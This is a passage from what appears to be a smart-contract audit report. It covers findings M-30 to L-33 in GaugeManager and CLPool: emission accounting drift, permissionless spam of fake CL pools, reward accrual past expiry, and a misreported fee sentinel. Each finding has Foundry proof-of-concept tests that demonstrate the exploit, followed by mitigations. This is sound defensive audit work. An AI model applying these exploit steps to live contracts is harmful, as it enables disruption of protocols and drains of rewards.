    function emergency() external view returns(bool){ return emer; }
    function notifyRewardAmount(address token, uint256 amt) external {
        require(IERC20Upgradeable(token).transferFrom(distribution, address(this), amt), "pull");
    }
}

contract MockMinter {
    function update_period() external { /* no-op */ }
}

// Helper: subclass GaugeManager to safely register a mock gauge
contract TestGaugeManager is GaugeManager {
    function forceRegisterGauge(address gauge_, address pool_) external {
        poolForGauge[gauge_] = pool_;
        isGauge[gauge_] = true;
        isAlive[gauge_] = true;
    }
    function approveForGauge(address gauge_, uint256 amount) external {
        IERC20Upgradeable(base).approve(gauge_, amount);
    }
}

contract EmissionDriftDoSTest is Test {
    TestGaugeManager gm;
    MockERC20 base;
    MockVE ve;
    MockPermissionsRegistry pr;
    MockVoter voter;
    MockMinter minter;
    MockGauge gauge;

    address pool;

    function setUp() external {
        base = new MockERC20();
        ve = new MockVE(address(base));
        pr = new MockPermissionsRegistry();
        voter = new MockVoter();
        minter = new MockMinter();

        gm = new TestGaugeManager();
        // init with minimal dependencies; only permissionRegistry is used for role checks
        gm.initialize(address(ve), address(0x1), address(0x2), address(0x3), address(0x4), address(0x5), address(pr), address(0x6));

        // set voter & minter through GaugeAdmin-gated functions; MockPermissionsRegistry returns true
        vm.prank(address(0xAA)); gm.setVoter(address(voter));
        vm.prank(address(0xAA)); gm.setMinter(address(minter));

        gauge = new MockGauge(address(gm));
        pool = address(0x9999);

        // register mock gauge into manager and approve it to pull rewards
        gm.forceRegisterGauge(address(gauge), pool);
        gm.approveForGauge(address(gauge), type(uint256).max);

        // advance time so epochStart > 0
        vm.warp(3600);
    }

    function test_DoS_WhenWeightsIncreaseAfterNotify() external {
        uint256 amount = 10 ether; // A

        // fund minter and approve GM for notify
        base.mint(address(minter), amount);
        vm.prank(address(minter)); base.approve(address(gm), amount);

        // at notify: totalWeight W0 = 1e18
        voter.setTotalWeight(1e18);
        vm.prank(address(minter)); gm.notifyRewardAmount(amount);
        assertEq(base.balanceOf(address(gm)), amount, "GM holds minted HYBR");

        // after notify: inflate weights to w_new and W1
        uint256 wNew = 100e18;
        voter.setWeight(pool, wNew);
        voter.setTotalWeight(wNew);

        address[] memory arr = new address[](1); arr[0] = address(gauge);
        vm.expectRevert();
        gm.distribute(arr); // reverts when gauge tries to pull > balance from GM
    }
}


## Suggested Mitigation
Snapshot per-epoch weights and use those consistently for both index calculation and accrual. Concretely: (a) On epoch rollover (or in the same transaction as minting), persist totalWeightSnap = IVoter.totalWeight() and weightsSnap[pool] for all active pools (or have Voter expose a read-only snapshot map bound to epochStart); (b) Compute index using totalWeightSnap; (c) In _updateForAfterDistribution, use weightsSnap[pool] instead of live weights. This guarantees sum(distributed) == minted and prevents over-allocation DoS. Alternatively, freeze voting from epoch start until all distributions are processed and ensure _updateForAfterDistribution only reads the frozen/snapshotted weights. Avoid computing claimable from live weights that can change after notifyRewardAmount.


## [M-30]. GaugeManager distributes using live weights after index mint, allowing per-gauge claimable > minted and reverting distributions

## Derived From Pattern/Invariant
Emission accounting mismatch (no epoch snapshot) can break conservation and DoS payouts

## Exploit Type
AccountingInvariantViolation

## Location
GaugeManager.notifyRewardAmount

## Minimim Privilege Required
Permissionless

## Description
GaugeManager computes the global index at mint using IVoter.totalWeight() at notify time, but per-gauge claimables are later computed using current live IVoter.weights(_pool) without an epoch snapshot. If weights increase after notifyRewardAmount(), a gauge’s _share = weights(_pool) * (index - supplyIndex) / 1e18 can exceed the actually minted HYBR. On distribute(), the gauge pulls claimable from GaugeManager via ERC20.transferFrom, which reverts due to insufficient balance, DoSing distribution (and batch loops), or, if weights decrease, strands HYBR in GaugeManager.

Vulnerable snippets:
- notifyRewardAmount uses totalWeight at mint:
  uint256 totalWeight = IVoter(voter).totalWeight();
  if (totalWeight > 0) _ratio = amount * 1e18 / Math.max(totalWeight, 1);
  if (_ratio > 0) { index += _ratio; }

- _updateForAfterDistribution uses live per-pool weights (no snapshot):
  uint256 _supplied = IVoter(voter).weights(_pool);
  uint256 _delta = _index - _supplyIndex;
  uint256 _share = _supplied * _delta / 1e18;
  claimable[_gauge] += _share;

## Impact
Because GaugeManager accrues per-gauge claimable using live voter weights while the index increment is computed using totalWeight at notify time, any weight changes between notifyRewardAmount and distribution break conservation: the sum of gauge claimables can exceed the HYBR minted to GaugeManager. This causes IGauge.notifyRewardAmount to attempt transferFrom more tokens than the manager holds and revert, DoSing distribution for affected gauges (and batch loops). Conversely, if weights drop, HYBR remains stranded in GaugeManager until manual intervention. This is a protocol-functionality failure and misaccounting of emissions rather than a direct user fund loss.

## Proof of Concept
High-level exploit steps
1) Attacker ensures totalWeight is very small just before emissions are minted.
2) Minter calls GaugeManager.notifyRewardAmount(amount). Manager receives amount HYBR and updates index using that small totalWeight.
3) Attacker then increases their pool weight massively (e.g., via Voter) before calling distribute for their gauge.
4) On _distribute, GaugeManager computes share = live weights(pool) * (index - supplyIndex) / 1e18, which now far exceeds the minted amount because weights grew after notify.
5) Gauge.notifyRewardAmount pulls tokens from GaugeManager via transferFrom and reverts due to insufficient balance. Batch distribution reverts on the first failing gauge; HYBR can also be stranded if weights move the other way.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "contracts/GaugeManager.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/IERC20Upgradeable.sol";

// Minimal ERC20 compatible with IERC20Upgradeable
contract MockERC20 is IERC20Upgradeable {
    string public name = "MOCK";
    string public symbol = "MOCK";
    uint8 public override decimals = 18;
    uint256 private _total;
    mapping(address => uint256) private _bal;
    mapping(address => mapping(address => uint256)) public override allowance;

    function totalSupply() external view override returns (uint256) { return _total; }
    function balanceOf(address a) public view override returns (uint256) { return _bal[a]; }
    function transfer(address to, uint256 amt) external override returns (bool) {
        require(_bal[msg.sender] >= amt, "BAL");
        _bal[msg.sender] -= amt; _bal[to] += amt; return true;
    }
    function approve(address sp, uint256 amt) external override returns (bool) {
        allowance[msg.sender][sp] = amt; return true;
    }
    function transferFrom(address from, address to, uint256 amt) external override returns (bool) {
        require(allowance[from][msg.sender] >= amt, "ALLOW");
        require(_bal[from] >= amt, "BAL");
        allowance[from][msg.sender] -= amt; _bal[from] -= amt; _bal[to] += amt; return true;
    }
    function mint(address to, uint256 amt) external { _bal[to] += amt; _total += amt; }
}

contract MockVE { address public _token; constructor(address t){_token=t;} function token() external view returns(address){return _token;} }

contract MockVoter {
    uint256 public total; mapping(address=>uint256) public w;
    function setTotal(uint256 t) external { total = t; }
    function setWeight(address p, uint256 we) external { w[p]=we; }
    function totalWeight() external view returns(uint256){ return total; }
    function weights(address p) external view returns(uint256){ return w[p]; }
}

contract MockMinter { function update_period() external returns (uint256){ return 0; } }

contract MockPermissionsRegistry {
    function hasRole(bytes memory, address) external pure returns(bool){return true;}
    function hybraTeamMultisig() external view returns(address){return address(this);} }

contract MockTokenHandler {
    mapping(address=>bool) wl; mapping(address=>bool) conn;
    function setWL(address a,bool v) external {wl[a]=v;}
    function setConn(address a,bool v) external {conn[a]=v;}
    function isWhitelisted(address a) external view returns(bool){return wl[a];}
    function isConnector(address a) external view returns(bool){return conn[a];}
}

interface IPairInfo { function token0() external view returns(address); function token1() external view returns(address); }
contract MockPairInfo is IPairInfo { address a; address b; constructor(address _a,address _b){a=_a;b=_b;} function token0() external view override returns(address){return a;} function token1() external view override returns(address){return b;} }

contract MockPairFactory is IPairFactory {
    function allPairsLength() external pure override returns(uint){return 0;}
    function isPair(address) external pure override returns(bool){return true;}
    function allPairs(uint) external pure override returns(address){return address(0);} 
    function pairCodeHash() external pure override returns(bytes32){return bytes32(0);} 
    function getPair(address,address,bool) external pure override returns(address){return address(0);} 
    function createPair(address,address,bool) external pure override returns(address){return address(0);} 
    function isGenesis(address) external pure override returns(bool){return false;}
}

contract DummyBribe { }
contract MockBribeFactory is IBribeFactory { 
    function createInternalBribe(address[] memory) external pure override returns(address){return address(0);} 
    function createExternalBribe(address[] memory) external pure override returns(address){return address(0);} 
    function createBribe(address,address,address,string memory) external returns(address){ return address(new DummyBribe()); }
}

contract MockGauge is IGauge {
    bool public emer;
    function notifyRewardAmount(address token, uint amount) external override { IERC20Upgradeable(token).transferFrom(msg.sender, address(this), amount); }
    function getReward(address, address[] memory, uint8) external override {}
    function getReward(address, uint8) external override {}
    function claimFees() external override returns(uint,uint){return(0,0);} 
    function left(address) external pure override returns(uint){return 0;}
    function rewardRate(address) external pure override returns(uint){return 0;}
    function balanceOf(address) external pure override returns(uint){return 0;}
    function isForPair() external pure override returns(bool){return true;}
    function totalSupply() external pure override returns(uint){return 0;}
    function earned(address, address) external pure override returns(uint){return 0;}
    function setGenesisPool(address) external override {}
    function depositsForGenesis(address, uint256, uint256) external override {}
    function emergency() external view override returns (bool){return emer;}
}

contract MockGaugeFactory is IGaugeFactory {
    function createGauge(address,address,address,address,address,address,bool) external returns(address){ return address(new MockGauge()); }
    function gauges(uint256) external pure returns(address){return address(0);} 
    function length() external pure returns(uint){return 0;}
}

contract GaugeManager_WeightsDrift_Test is Test {
    GaugeManager mgr;
    MockERC20 base;
    MockVE ve;
    MockVoter voter;
    MockMinter minter;
    MockPermissionsRegistry pr;
    MockTokenHandler th;
    MockPairFactory pf;
    MockGaugeFactory gf;
    MockBribeFactory bf;

    function setUp() public {
        base = new MockERC20();
        ve = new MockVE(address(base));
        voter = new MockVoter();
        minter = new MockMinter();
        pr = new MockPermissionsRegistry();
        th = new MockTokenHandler();
        pf = new MockPairFactory();
        gf = new MockGaugeFactory();
        bf = new MockBribeFactory();

        mgr = new GaugeManager();
        mgr.initialize(address(ve), address(th), address(gf), address(gf), address(pf), address(pf), address(pr), address(0xBEEF));
        mgr.setBribeFactory(address(bf));
        mgr.setVoter(address(voter));
        mgr.setMinter(address(minter));
    }

    function test_Revert_Distribute_When_Claimable_Exceeds_Balance() public {
        // Prepare pool & gauge
        MockPairInfo pool = new MockPairInfo(address(base), address(0xCAFE));
        th.setWL(address(base), true); th.setWL(address(0xCAFE), true); th.setConn(address(base), true);
        (address gauge,,) = mgr.createGauge(address(pool), 0);

        // 1) Minter notifies with tiny totalWeight
        voter.setTotal(1);
        uint256 mintAmt = 1000;
        base.mint(address(minter), mintAmt);
        vm.prank(address(minter)); base.approve(address(mgr), mintAmt);
        vm.prank(address(minter)); mgr.notifyRewardAmount(mintAmt);
        assertEq(base.balanceOf(address(mgr)), mintAmt, "manager should hold minted HYBR");

        // 2) After notify, attacker increases weight massively for their pool
        voter.setWeight(address(pool), 1000);

        // Sanity: expected share greatly exceeds manager balance
        uint256 expectedShare = 1000 * (mintAmt); // index delta = 1000e18 (since totalWeight=1), so share=1000*1000
        assertGt(expectedShare, base.balanceOf(address(mgr)));

        // 3) Distribute: gauge attempts to pull more than manager balance and reverts
        address[] memory gs = new address[](1); gs[0] = gauge;
        vm.expectRevert();
        mgr.distribute(gs);
    }
}


## Suggested Mitigation
Make index accrual and per-gauge share use the same epoch-snapshotted weights. Options:
1) Snapshot in Voter and consume snapshots in GaugeManager: Extend IVoter with totalWeightAt(epoch) and weightOfAt(pool, epoch). At epoch start (when minter updates period), Voter freezes current weights for that epoch. In GaugeManager.notifyRewardAmount, compute ratio using totalWeightAt(currEpoch). In _updateForAfterDistribution, use weightOfAt(pool, epochOfLastAccrual) instead of live weights(). This guarantees conservation and prevents manipulation.
2) Enforce next-epoch voting: Make all vote changes effective only from the next epoch (and optionally disallow mid-epoch changes). Then live weights are constant within the epoch where notifyRewardAmount occurs, making current logic safe as long as distribute happens within the same epoch. This still benefits from reading epoch-frozen weights rather than live mappings to avoid timing variance.
3) Interim hardening to avoid DoS: In _distribute, cap per-gauge transfer to the manager’s available balance (and keep track of remainder). This prevents reverts but does not fix misaccounting; use only as a temporary mitigation until (1) or (2) is implemented.
Implementation sketch for (1):
- In Voter: on epoch start, store totalWeightSnapshot[epoch] and weightsSnapshot[epoch][pool].
- In GaugeManager: store lastAccruedEpoch[gauge]. When notifyRewardAmount(amount), compute index += amount*1e18/totalWeightSnapshot[currEpoch]. In _updateForAfterDistribution(g), compute delta using index, and share = weightsSnapshot[currEpoch][pool] * delta / 1e18. Advance supplyIndex[g] and lastAccruedEpoch[g] accordingly.





 **Derived From** : Permissionless gauge creation allows arbitrary CL pools and pools[] spam (no factory check)

## [M-31]. DoS via permissionless CL gauge creation: arbitrary pools registered and pushed into pools[], bloating distribution loops

## Derived From Pattern/Invariant
Permissionless gauge creation allows arbitrary CL pools and pools[] spam (no factory check)

## Exploit Type
AuthByPass

## Location
GaugeManager.createGauge

## Minimim Privilege Required
Permissionless

## Description
GaugeManager.createGauge/_createGauge allows anyone to register a CL (gaugeType==1) "pool" without validating it against a trusted CL factory. For gaugeType==1, isPair is set to true unconditionally and no factory.isPool(_pool) check is performed. As a result, any EOA can deploy a trivial contract that exposes token0(), token1() and setGaugeAndPositionManager(), then call createGauge(pool, 1) to: (1) create a real GaugeCL via the trusted GaugeFactoryCL, (2) store the attacker-controlled pool in pools[], (3) mark the gauge alive and set unlimited HYBR allowance to the gauge. Repeating this with many fake pools grows pools[] unbounded. distributeAll() and distributeFees() iterate pools[] and will eventually exceed block gas limits, DoSing emissions and fee distribution. Vulnerable snippet (GaugeManager.sol):

function createGauge(address _pool, uint256 _gaugeType) external nonReentrant { (_gauge, _int, _ext) = _createGauge(_pool, _gaugeType); }
...
if (_gaugeType == 1) { isPair = true; }
...
if (_gaugeType == 1) {
  _gauge = IGaugeFactoryCL(_gaugeFactory).createGauge(..., _pool, ...);
  isCLGauge[_gauge] = true;
  ICLPool(_pool).setGaugeAndPositionManager(_gauge, nfpm); // untrusted external call
}
IERC20(base).approve(_gauge, type(uint256).max);
... pools.push(_pool);

No access control on createGauge(), no CL factory validation, and an untrusted external call into the attacker pool during creation together enable permissionless pools[] spam and distribution DoS.

## Impact
Because gaugeType==1 (CL) sets isPair = true without validating the pool against a trusted CL factory, any EOA can register arbitrary contracts as pools and mint real gauges via the trusted GaugeFactoryCL. This pushes attacker-controlled pool addresses into pools[]. distributeAll() and distributeFees() iterate pools[] entirely and can be driven over block gas, causing functional DoS of weekly emissions and fee sweeping if automation relies on the all‑loop variants. Although chunked variants exist, unbounded pools[] still degrades protocol operations and increases operational risk. Additionally, GaugeManager grants unlimited HYBR allowance to each new gauge, unnecessarily expanding the approval surface (still trusted code but broader blast radius).

## Proof of Concept
Reproduction steps (no external assumptions):

1) Deploy a fake CL pool that only implements:
   - token0() -> returns a whitelisted token (e.g., WETH)
   - token1() -> returns a whitelisted token (e.g., USDC)
   - setGaugeAndPositionManager(address,address) -> empty body

2) Ensure TokenHandler marks token0 and token1 as whitelisted and at least one as a connector.

3) Call GaugeManager.createGauge(fakePool, 1) from any EOA (no roles). For gaugeType==1:
   - isPair is forced to true (no factory.isPool check)
   - GaugeFactoryCL creates a real GaugeCL
   - ICLPool(fakePool).setGaugeAndPositionManager(...) is invoked on the attacker’s contract
   - GaugeManager approves unlimited HYBR to the new gauge and pushes fakePool into pools[]

4) Repeat step 3 many times with new FakeCLPool instances to grow pools[] without bound. Subsequent calls to distributeAll() / distributeFees() iterate the entire pools[] and can exceed block gas, halting full-cycle emissions/fees distribution when those all-loop functions are used.

## Proof of Code
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import {GaugeManager} from "ve33/contracts/GaugeManager.sol";

interface IPermissionsRegistry { function hasRole(bytes memory, address) external view returns (bool); function hybraTeamMultisig() external view returns (address); }
interface ITokenHandler { function isWhitelisted(address) external view returns (bool); function isConnector(address) external view returns (bool); }
interface IBribeFactory { function createBribe(address, address, address, string memory) external returns (address); }
interface IGaugeFactoryCL { function createGauge(address,address,address,address,address,address,bool,address) external returns (address); }

contract ERC20Mock {
  string public name; string public symbol; uint8 public decimals = 18;
  mapping(address=>mapping(address=>uint256)) public allowance;
  mapping(address=>uint256) public balanceOf;
  event Approval(address indexed owner, address indexed spender, uint256 value);
  constructor(string memory n,string memory s){name=n;symbol=s;}
  function approve(address spender, uint256 value) external returns (bool){ allowance[msg.sender][spender]=value; emit Approval(msg.sender,spender,value); return true; }
}

contract VEMock { address public immutable _token; constructor(address t){_token=t;} function token() external view returns(address){return _token;} }

contract PermissionsRegistryMock is IPermissionsRegistry {
  function hasRole(bytes memory, address) external pure override returns(bool){ return true; }
  function hybraTeamMultisig() external pure override returns(address){ return address(0xBEEF); }
}

contract TokenHandlerMock is ITokenHandler {
  mapping(address=>bool) wl; mapping(address=>bool) conn;
  function setWhitelist(address t,bool v) external { wl[t]=v; }
  function setConnector(address t,bool v) external { conn[t]=v; }
  function isWhitelisted(address t) external view override returns(bool){ return wl[t]; }
  function isConnector(address t) external view override returns(bool){ return conn[t]; }
}

contract BribeMock {}
contract BribeFactoryMock is IBribeFactory { function createBribe(address, address, address, string memory) external returns(address){ return address(new BribeMock()); } }

contract DummyGaugeCL { function emergency() external pure returns(bool){return false;} }
contract GaugeFactoryCLMock is IGaugeFactoryCL { function createGauge(address,address,address,address,address,address,bool,address) external returns(address){ return address(new DummyGaugeCL()); } }

// Attacker-controlled fake CL pool
contract FakeCLPool {
  address public immutable token0; address public immutable token1;
  address public lastGauge; address public lastNfpm;
  constructor(address t0,address t1){ token0=t0; token1=t1; }
  function setGaugeAndPositionManager(address g, address n) external { lastGauge=g; lastNfpm=n; }
}

contract PairFactoryStub { }

contract GaugeManager_CL_Permissionless_Spam_Test is Test {
  GaugeManager gm;
  ERC20Mock base; VEMock ve;
  PermissionsRegistryMock pr; TokenHandlerMock th;
  GaugeFactoryCLMock gfcl;
  PairFactoryStub pfv2; PairFactoryStub pfcl;
  BribeFactoryMock bf;
  address nfpm = address(0x1234);

  function setUp() public {
    base = new ERC20Mock("HYBR","HYBR");
    ve = new VEMock(address(base));
    pr = new PermissionsRegistryMock();
    th = new TokenHandlerMock();
    gfcl = new GaugeFactoryCLMock();
    pfv2 = new PairFactoryStub(); pfcl = new PairFactoryStub();

    gm = new GaugeManager();
    gm.initialize(address(ve), address(th), address(0xABCD), address(gfcl), address(pfv2), address(pfcl), address(pr), nfpm);

    bf = new BribeFactoryMock();
    gm.setBribeFactory(address(bf));

    // whitelist tokens and mark connector
    address WETH = address(0xC0FFEE);
    address USDC = address(0xFACE);
    th.setWhitelist(WETH, true); th.setWhitelist(USDC, true);
    th.setConnector(WETH, true);
  }

  function test_anyone_can_register_arbitrary_CL_pool() public {
    address WETH = address(0xC0FFEE);
    address USDC = address(0xFACE);
    address attacker = address(0xA11CE);

    vm.startPrank(attacker);
    FakeCLPool p = new FakeCLPool(WETH, USDC);
    (address g,,) = gm.createGauge(address(p), 1); // gaugeType==1 (CL) has no factory validation
    vm.stopPrank();

    // A real GaugeCL was created for attacker-controlled pool, and registered
    assertTrue(gm.isGauge(g), "gauge not registered");
    assertTrue(gm.isCLGauge(g), "not marked CL gauge");
    assertEq(gm.poolForGauge(g), address(p), "poolForGauge mismatch");

    // GaugeManager granted unlimited HYBR allowance to the new gauge
    assertEq(base.allowance(address(gm), g), type(uint256).max, "approval not max");

    // Spam: repeat to demonstrate unbounded growth potential
    vm.startPrank(attacker);
    for (uint i=0; i<5; i++) {
      FakeCLPool p2 = new FakeCLPool(WETH, USDC);
      gm.createGauge(address(p2), 1);
    }
    vm.stopPrank();
    // If desired, one can now call distributeAll() and observe gas increases with more pools.
  }
}


## Suggested Mitigation
Fully gate CL gauge creation to trusted pools and avoid untrusted external calls during permissionless flows:

1) For _gaugeType == 1 (CL), validate the pool via the configured CL factory before proceeding:
   - require(ICLFactory(_factory).isPool(_pool), "!POOL");
   - Only after passing this check, call ICLPool(_pool).setGaugeAndPositionManager(_gauge, nfpm).

2) Do not set isPair = true unconditionally for CL; derive from factory validation instead. Example diff inside _createGauge:
   - Replace the current gaugeType==1 branch with:
     {
       require(ICLFactory(_factory).isPool(_pool), "!POOL");
       isPair = true;
     }

3) Consider rate-limiting or admin‑whitelisting gauge creation, or maintaining a cap on total pools[] growth (optional policy choice if permissionless creation is not a hard requirement).

4) Operationally prefer chunked distribution (distribute(start,finish) and distributeFees(start,finish)) and deprecate distributeAll()/distributeFees() without ranges in automation to minimize DoS blast radius.

These changes remove the root cause (accepting arbitrary CL pools) and reduce attack surface (untrusted external call only after factory validation).





 **Derived From** : post.lastUpdated >= pre.lastUpdated && post.lastUpdated <= block.timestamp

## [M-32]. CLPool rewards ignore periodFinish: anyone can trigger accrual past expiry via swap/updateRewardsGrowthGlobal

## Derived From Pattern/Invariant
post.lastUpdated >= pre.lastUpdated && post.lastUpdated <= block.timestamp

## Exploit Type
TimestampDependentLogic

## Location
CLPool.updateRewardsGrowthGlobal

## Minimim Privilege Required
Permissionless

## Description
In CLPool._updateRewardsGrowthGlobal(), reward accrual uses rewardRate * timeDelta and never checks periodFinish. As a result, after the configured reward period ends, anyone calling swap that crosses a tick (or the gauge calling updateRewardsGrowthGlobal) continues to accrue rewards and deplete rewardReserve. This violates temporal deadlines/expiries and lets rewards accrue past their intended end. Vulnerable snippet:

function _updateRewardsGrowthGlobal() internal {
    uint32 timestamp = _blockTimestamp();
    uint256 _lastUpdated = lastUpdated;
    uint256 timeDelta = timestamp - _lastUpdated;
    if (timeDelta != 0) {
        if (rewardReserve > 0) {
            uint256 reward = rewardRate * timeDelta; // no periodFinish cap
            if (reward > rewardReserve) reward = rewardReserve;
            rewardReserve -= reward;
            if (stakedLiquidity > 0) {
                rewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, stakedLiquidity);
            } else {
                rollover += reward;
            }
        }
        lastUpdated = timestamp;
    }
}

Because periodFinish is never enforced, accrual beyond expiry is possible until rewardReserve drains.

## Impact
Reward accrual is not capped by periodFinish, so rewards continue accruing after the configured end time whenever _updateRewardsGrowthGlobal is triggered. This can be done permissionlessly by any swap that crosses an initialized tick (the pool calls _updateRewardsGrowthGlobal() on tick cross), or by the gauge via updateRewardsGrowthGlobal(). As a result, rewardReserve is depleted for time after expiry, violating the schedule and misallocating emissions that should have remained unspent or rolled. While total payout cannot exceed rewardReserve, the time-based schedule is broken, which impacts the protocol’s reward pacing and may consume leftover rewards intended for future periods. Severity: Medium.

## Proof of Concept
High-level PoC (permissionless trigger via swap):
1) Create a pool and initialize it; ensure at least one initialized tick boundary exists (e.g., by minting a small position) so a swap can cross a tick.
2) Gauge (or whoever controls it) configures a reward schedule via syncReward: set rewardRate > 0, rewardReserve > 0, and periodFinish = now + DURATION. Ensure lastUpdated is set to now (e.g., by a single updateRewardsGrowthGlobal call or by any prior swap that triggered it in the same block).
3) Advance time so that block.timestamp > periodFinish.
4) Execute a swap that is constructed to cross the next initialized tick (so the pool calls _updateRewardsGrowthGlobal internally).
5) Observe that rewardReserve decreases by rewardRate * (now - lastUpdated), which includes the time strictly after periodFinish. This proves accrual continues past expiry without any cap. This same over-accrual is also observable if the gauge calls updateRewardsGrowthGlobal() directly.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;
pragma abicoder v2;

import "forge-std/Test.sol";
import {CLPool} from "contracts/core/CLPool.sol";

contract PeriodFinishIgnoredTest is Test {
    CLPool pool;
    address gaugeManager = address(0xBEEF);
    address gauge = address(0xCAFE);

    // Minimal initializer inputs
    address factory = address(0xF1);
    address token0 = address(0xA0); // not used in this test path
    address token1 = address(0xA1); // not used in this test path
    int24 tickSpacing = 50;
    uint160 sqrtP = 79228162514264337593543950336; // 2^96 (price=1.0 in Q64.96)

    function setUp() public {
        pool = new CLPool();
        vm.warp(100);
        pool.initialize(factory, token0, token1, tickSpacing, gaugeManager, sqrtP);
        // set gauge once via gaugeManager
        vm.prank(gaugeManager);
        pool.setGaugeAndPositionManager(gauge, address(0));
    }

    function testRewardsAccruePastPeriodFinish() public {
        // 1) Prime lastUpdated to now (with zero reserve/rate)
        vm.prank(gauge);
        pool.syncReward(0, 0, block.timestamp + 50);
        vm.prank(gauge);
        pool.updateRewardsGrowthGlobal();
        assertEq(uint256(pool.lastUpdated()), block.timestamp, "lastUpdated should be now");

        // 2) Configure actual schedule ending at t=150
        // rewardRate = 10, rewardReserve = 10_000, periodFinish = 150
        vm.prank(gauge);
        pool.syncReward(10, 10_000, 150);

        // 3) Move time past periodFinish
        vm.warp(200);

        // 4) Trigger accrual after expiry via privileged path (simulates what swap tick-cross does internally)
        vm.prank(gauge);
        pool.updateRewardsGrowthGlobal();

        // Expected: rewardReserve decreased by rewardRate * (now - lastUpdated)
        // lastUpdated was 100; now 200 => delta=100; reward=10*100=1000
        // This includes 50 seconds beyond periodFinish (150->200), which should not accrue
        assertEq(pool.rewardReserve(), 10_000 - 1000, "accrues beyond periodFinish");
        assertEq(pool.periodFinish(), 150, "periodFinish set but ignored in accrual");
    }
}


## Suggested Mitigation
Cap accrual by periodFinish and set lastUpdated to the capped time so it cannot accrue post-expiry on later calls. Example fix inside _updateRewardsGrowthGlobal:

function _updateRewardsGrowthGlobal() internal {
    uint32 timestamp = _blockTimestamp();
    uint256 _lastUpdated = lastUpdated;

    // Determine the effective end of the current schedule
    uint256 endTs = periodFinish > 0 ? periodFinish : timestamp;
    uint256 cur = timestamp < endTs ? timestamp : endTs; // min(timestamp, periodFinish)

    if (cur > _lastUpdated) {
        uint256 timeDelta = cur - _lastUpdated;
        if (rewardReserve > 0) {
            uint256 reward = rewardRate * timeDelta;
            if (reward > rewardReserve) reward = rewardReserve;
            rewardReserve -= reward;
            if (stakedLiquidity > 0) {
                rewardGrowthGlobalX128 += FullMath.mulDiv(reward, FixedPoint128.Q128, stakedLiquidity);
            } else {
                rollover += reward;
            }
        }
        lastUpdated = uint32(cur);
    } else if (lastUpdated == 0) {
        // Optional: initialize lastUpdated once to prevent large deltas later
        lastUpdated = timestamp;
    }
}

Additionally, consider invoking _updateRewardsGrowthGlobal() just before writing a new schedule in syncReward(), so the previous schedule is settled up to its periodFinish and the new schedule starts from a clean checkpoint.





 **Derived From** : collectFees returns 1 wei without transferring (sentinel misreport)

## [L-33]. CLPool.collectFees misreports 1 wei collected due to sentinel, returning non-zero with zero transfer

## Derived From Pattern/Invariant
collectFees returns 1 wei without transferring (sentinel misreport)

## Exploit Type
StandardViolation

## Location
CLPool.collectFees

## Minimim Privilege Required
RequiresRole

## Description
collectFees keeps a 1-wei sentinel in gaugeFees to avoid zeroing the storage slot. When gaugeFees.token0/token1 == 1, the function returns amount=1 and emits an event with 1, but performs no transfer, violating standard expectations that returned amounts and events match actual transfers. Vulnerable snippet:

function collectFees() external lock onlyGauge returns (uint128 amount0, uint128 amount1) {
    amount0 = gaugeFees.token0;
    amount1 = gaugeFees.token1;
    if (amount0 > 1) {
        gaugeFees.token0 = 1;
        TransferHelper.safeTransfer(token0, msg.sender, --amount0);
    } // else returns 1 with no transfer
    if (amount1 > 1) {
        gaugeFees.token1 = 1;
        TransferHelper.safeTransfer(token1, msg.sender, --amount1);
    } // else returns 1 with no transfer
    emit CollectFees(msg.sender, amount0, amount1);
}

This deviates from standard-integrator assumptions (return values reflect actual transfers) and can break downstream accounting or cause integration failures if callers rely on the return/event.

## Impact
When gaugeFees.token0 or token1 equals the 1-wei sentinel, collectFees returns amount=1 and emits 1, but transfers 0. This misreports state to integrators that rely on returns or events for accounting or forwarding. While no funds are lost, this can cause off-by-one accounting, futile forwarding attempts, or revert paths if downstream assumes a real transfer happened. Impact is functional inconsistency and possible integration breakage, not asset loss.

## Proof of Concept
Steps to reproduce:
1) Call collectFees once after forcing gaugeFees.token0 = 1 (sentinel state) with no actual fees accrued.
2) The function will return amount0 = 1 and emit CollectFees(1, ...), but will not execute any transfer since the branch requires > 1. The gauge (caller) didn’t receive any token0 despite the nonzero return/event.
3) Any integration that assumes the returned 1 was actually received may mis-account or fail when attempting to forward it.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity =0.7.6;

import "forge-std/Test.sol";
import "forge-std/StdStorage.sol";
import {CLPool} from "cl/contracts/core/CLPool.sol";
import {TickMath} from "cl/contracts/core/libraries/TickMath.sol";

contract CollectFeesSentinelTest is Test {
    using stdStorage for StdStorage;
    StdStorage private stdstore;

    CLPool pool;
    address gauge = address(0xBEEF);
    address nft = address(0xFEE2);
    address gaugeMgr = address(this);

    function setUp() public {
        pool = new CLPool();
        uint160 sqrtP = TickMath.getSqrtRatioAtTick(0);
        // Minimal init; tokens are dummies, but no transfer path will be executed in this test
        pool.initialize(address(0x1234), address(0x1111), address(0x2222), 60, gaugeMgr, sqrtP);
        // set gauge and nfpm via gaugeManager
        vm.prank(gaugeMgr);
        pool.setGaugeAndPositionManager(gauge, nft);

        // Force the sentinel state: gaugeFees.token0 = 1, token1 = 0
        // gaugeFees is a struct of two uint128 packed in one slot; setting slot value to 1 sets token0=1, token1=0
        uint256 slot = stdstore.target(address(pool)).sig("gaugeFees()").find();
        vm.store(address(pool), bytes32(slot), bytes32(uint256(1)));
    }

    function testCollectFees_ReturnsOneWithoutTransferAndKeepsSentinel() public {
        vm.prank(gauge);
        (uint128 a0, uint128 a1) = pool.collectFees();

        // Misreport: returns 1 even though no transfer executed (branch is only for >1)
        assertEq(a0, 1, "returns sentinel 1 with zero transfer");
        assertEq(a1, 0, "no token1 fees");

        // Sentinel remains; no mutation when == 1
        (uint128 gf0, uint128 gf1) = pool.gaugeFees();
        assertEq(gf0, 1, "sentinel retained for token0");
        assertEq(gf1, 0, "token1 remains 0");
    }
}


## Suggested Mitigation
Ensure returned values and event reflect the actual transferred amounts while preserving the 1-wei sentinel. Example:

function collectFees() external override lock onlyGauge returns (uint128 amount0, uint128 amount1) {
    uint128 raw0 = gaugeFees.token0;
    uint128 raw1 = gaugeFees.token1;

    uint128 toTransfer0 = raw0 > 1 ? raw0 - 1 : 0;
    uint128 toTransfer1 = raw1 > 1 ? raw1 - 1 : 0;

    if (toTransfer0 > 0) {
